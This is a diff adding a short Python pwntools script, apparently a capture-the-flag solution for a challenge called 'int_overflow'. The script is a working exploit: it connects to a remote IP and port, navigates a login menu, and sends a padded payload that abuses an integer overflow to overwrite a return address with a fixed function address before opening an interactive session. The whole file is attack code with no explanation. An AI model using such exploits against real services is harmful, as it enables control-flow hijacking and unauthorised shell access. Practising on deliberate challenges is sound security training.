@@ -1,0 +1,15 @@
+from pwn import *
+context.log_level="debug"
+p=remote("111.198.29.45","57285")
+payload="nnnnn"+"a"*(0x13)+p32(0x0804868B)
+payload=payload.ljust(0x104)
+#p=process("./int_overflow")
+p.recvuntil(":")
+p.sendline("1")
+p.recvuntil(":")
+p.sendline("mask")
+p.recv()
+#gdb.attach(p,"b*0x080486F2")
+p.sendline(payload)
+p.recv()
+p.interactive()
